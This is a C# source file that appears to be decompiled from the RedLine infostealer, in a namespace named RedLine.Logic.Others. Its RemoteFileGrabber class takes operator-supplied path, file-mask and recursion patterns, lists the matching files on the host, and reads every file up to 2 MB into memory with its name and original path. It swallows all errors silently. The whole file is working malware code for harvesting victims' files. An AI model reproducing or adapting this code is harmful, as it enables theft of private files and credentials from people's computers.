using RedLine.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace RedLine.Logic.Others
{
  public static class RemoteFileGrabber
  {
    public static IList<RemoteFile> ParseFiles(IEnumerable<string> patterns)
    {
      List<RemoteFile> remoteFileList = new List<RemoteFile>();
      try
      {
        foreach (string pattern in patterns)
        {
          try
          {
            string[] strArray = pattern.Split(new string[1]
            {
              "|"
            }, StringSplitOptions.RemoveEmptyEntries);
            if (strArray != null)
            {
              if (strArray.Length == 3)
              {
                foreach (string enumerateFile in Directory.EnumerateFiles(Environment.ExpandEnvironmentVariables(strArray[0]), strArray[1], strArray[2] == "1" ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly))
                {
                  try
                  {
                    FileInfo fileInfo = new FileInfo(enumerateFile);
                    if (fileInfo.Exists)
                    {
                      if (fileInfo.Length <= 2097152L)
                        remoteFileList.Add(new RemoteFile()
                        {
                          FileName = fileInfo.Name,
                          Body = File.ReadAllBytes(enumerateFile),
                          SourcePath = enumerateFile
                        });
                    }
                  }
                  catch
                  {
                  }
                }
              }
            }
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      return (IList<RemoteFile>) remoteFileList;
    }
  }
}
